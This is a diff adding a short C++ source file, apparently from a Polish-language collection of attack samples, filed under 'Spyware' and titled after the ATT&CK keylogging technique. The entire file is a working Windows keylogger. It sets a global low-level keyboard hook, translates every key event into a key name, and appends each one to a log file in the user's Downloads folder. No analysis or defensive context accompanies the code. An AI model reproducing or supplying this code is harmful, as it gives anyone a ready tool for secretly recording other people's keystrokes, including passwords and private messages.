@@ -1,0 +1,64 @@
+---
+title: "Collection.T1056.001.Keylogging.keylo"
+folder: "Całe Ataki/1. Spyware"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+void zapiszDoPliku(const std::wstring& tekst, const std::string& nazwaPliku) {
+    std::wofstream plik(nazwaPliku, std::ios_base::app);
+    if (plik.is_open()) {
+        plik << tekst;
+        plik.close();
+    }
+    else {
+        std::cerr << "Nie udalo sie otworzyc pliku do zapisu!" << std::endl;
+    }
+}
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION) {
+        KBDLLHOOKSTRUCT* pkbhs = (KBDLLHOOKSTRUCT*)lParam;
+        DWORD dwMsg = 1;
+        dwMsg += pkbhs->scanCode << 16;
+        dwMsg += pkbhs->flags << 24;
+
+        wchar_t lpszKeyName[1024] = { 0 };
+
+        int i = GetKeyNameTextW(dwMsg, lpszKeyName, 0xFF);
+        if (i == 0) {
+            std::wcerr << "Nie udalo sie pobrac nazwy klawisza!" << std::endl;
+            return 1;
+        }
+
+        std::wstring key = lpszKeyName;
+        zapiszDoPliku(key, "C:\\Users\\User\\Downloads\\logs\\log.txt"); // Zapisujemy każdy klawisz do pliku
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    
+
+    HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+    if (hKeyboardHook == NULL) {
+        std::cerr << "Nie udalo sie ustawic hooka klawiatury!" << std::endl;
+        return 1;
+    }
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    UnhookWindowsHookEx(hKeyboardHook);
+    
+    return 0;
+}
